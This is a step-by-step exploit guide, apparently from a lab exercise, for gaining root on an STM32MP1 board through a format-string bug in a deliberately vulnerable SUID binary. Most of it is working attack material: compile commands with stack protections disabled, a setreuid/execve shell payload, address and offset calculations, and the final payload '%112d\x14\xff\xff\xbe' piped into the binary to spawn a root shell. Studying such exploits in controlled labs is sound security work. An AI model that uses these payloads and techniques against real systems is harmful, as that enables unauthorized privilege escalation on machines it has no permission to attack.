# Privilege Escalation Using a Formatted String Exploit Setup Guide

## Introduction
This guide explains how to perform privilege escalation by exploiting a vulnerable binary with the SUID attribute enabled. The attack involves using a format string to hijack the control of the program. Follow the steps below to set up the attack on the STM32MP1.

## 1. Transfer and Compile the Vulnerable Code
The first step is to set up the vulnerable binary on the target machine. To do this, transfer the source file `vuln.c` to the target machine. Then, log in as root on this machine and compile the source code with stack protections disable. Use the following command to compile the code:
```bash
g++ -Wall -g -z execstack -fno-stack-protector vuln.c -o vuln
```

Once the compilation is complete, set the executable rights for low-privileged users and enable the SUID attribute on the binary so that it runs with the owner's privileges (root):
```bash
chmod 755 vuln
chmod u+s vuln
```

## 2. Create the Shellcode
Next, create a shellcode that will open a terminal with root privileges. This shellcode needs to perform two actions:
- Set the EUID (Effective User ID) to 0 (root).
- Execute a terminal using the `execve` command.

Here’s an example of C code that illustrates what the shellcode should do:
```c
int main(){
    setreuid(0,0);
    char *args[] = {"/bin/sh", NULL}; 
    execve("/bin/sh", args, NULL);
}
```

When creating the actual shellcode, keep the following points in mind:
- The shellcode must not contain null characters (\x00) because these are removed from the stack.
- On the STM32MP1, **busybox** is used, so we cannot simply execute `execve("bin/sh", NULL, NULL)` to open a terminal.

Once created, convert this shellcode to hexadecimal format.

## 3. Export the Shellcode into an Environment Variable
Once your shellcode is in hexadecimal format, we need to export it into an environment variable. To do this, place the hexadecimal code into the `export_shellcode.py` script, transfer the script to the target machine, and run the following command to export the shellcode:
```bash
export SHELLCODE=$(python3 /home/techi/export_shellcode.py)
```

Check that the environment variable was successfully added by running the `env` command. This will display all active environment variables, and you can confirm that SHELLCODE is included.

## 4. Retrieve the Address of the Environment Variable
### Retrieving the Address
We now need to retrieve the address of our shellcode in the stack when the vulnerable binary is executed. To do this, we will use the `getenv.c` program, which locates the address of an environment variable in memory.

Once the `getenv.c` source code is on the target machine, compile it and run it to get the address of the SHELLCODE environment variable:
```bash
g++ -o getenv getenv.c
./getenv SHELLCODE
```

This program provides an initial approximation of the address where our environment variable is located during a function call. However, this address needs to be adjusted based on the function call because the stack will be offset by the size of the function call.

Assume the address returned by getenv is 0xbeffff1d, and we run the vulnerable program with the command `./vuln < <(echo "username")`. In this case, the function call is 6 bytes long (the length of the command `./vuln` is 6 characters). Therefore, we need to adjust the address by subtracting these 6 bytes. Thus, the shellcode address during the execution of `./vuln` will be 0xbeffff17.

> Note: The address we retrieve here is the address of the value of the environment variable. Variables are stored in the stack in the form VARIABLE_NAME=VALUE. What we are retrieving here is the address where the value of the variable starts.

### Adjusting for Proper Alignment
The instructions of the shellcode are interpreted in groups of 4 bytes. To ensure that the shellcode is correctly interpreted, the starting address must be a multiple of 4. Addresses that are multiples of 4 end in 0, 4, 8, or C.

If the calculated address is not a multiple of 4 (for example, 0xbeffff17), add padding bytes to the end of the shellcode to shift the starting address to the left until it becomes a multiple of 4. For example, for the address 0xbeffff17, you would need to add 3 padding bytes, which will align the address to 0xbeffff14, a multiple of 4.

> Note: You can use any value for the padding, except \x00, because null bytes are removed from the stack.

## 5. Build the Format String
### Introduction
In this step, we will craft a format string that allows us to execute our shellcode. The goal is to use the username field to overwrite the return address of the vulnerable program, redirecting control to our shellcode.

### Format String Structure
The `username` field is 12 characters long, so the format string will be limited to 12 characters, excluding simple strings like `A*100`. Instead, we will use a format string with a minimum width specifier : `%100d`.  The minimum width specifier enforces a minimum length for the input. If the input is shorter than this length, padding bytes (spaces \x20) will be added to complete the length.

The general structure of the format string is:
```
"%100d" + "address of the shellcode in the stack in Little Endian"
```

Suppose the shellcode address is 0xbeffff14, the format string will look like this:
```
 %100d\x14\xff\xff\xbe
```

### Calculate the Padding
To overwrite the return address, we need to calculate the correct length for the minimum width specifier.

First, use GDB to gather the necessary information. Transfer GDB to the STM32MP1 target system by running the `install_gdb.sh` script on your machine. Then, launch the program in GDB on the target system:
```bash
gdb ./vuln
```

Use the following GDB commands to gather the necessary information:
```bash
break main
run
info frame
print &outbuf
```

The `info frame` command shows the address of the `lr` register, which contains the return address (e.g., 0xbefffc54). The `print &outbuf` command shows the address of the buffer used for the overflow (e.g., 0xbefffa4c).

With those informations, we can calculate the padding needed to overwrite the return address. The outbuf contains a string in the following format:
`outbuf = "ERR Wrong user : " + " " * (400 - len(format_string)) + <Padding bytes> + <Shellcode address>`

Based on the information gathered, we can calculate where the shellcode address will be written. For instance, if the format string is `%100d\x14\xff\xff\xbe`, the total length of the buffer would be `17 + (400 - 9) + 100 + 4 = 512` bytes. Thus, the shellcode address will be written at `0xbefffa4c + 17 + (400 - 9) + 100 = 0xbefffc48`.

Therefore to overwrite the return address, the offset must be:
```
int(0xbefffc54) - int(0xbefffa4c) - 17 - (400 - 9) = 112
```

Thus, the final format string becomes:
```
 %112d\x14\xff\xff\xbe
```

## 6. Running the Attack
Finally, we can execute the attack by running the following command:
```bash
(echo -e '%112d\x14\xff\xff\xbe'; cat -) | ./vuln
```

If every step is done correctly, you should gain a shell with root access.

> Note 1: : Depending on how the format string is passed to `vuln`, you might need to add a compensation character at the end of the string. This is because, in the vulnerable code (line 16), the last character of the `username` string may be replaced with a null character (\0).

> Note 2: The `cat` command in the above exploit is used to keep the shell open. If you don't include `cat`, the shell will be spawned, but it will close immediately after execution. The `cat` command keeps the input stream open, preventing the shell from terminating.
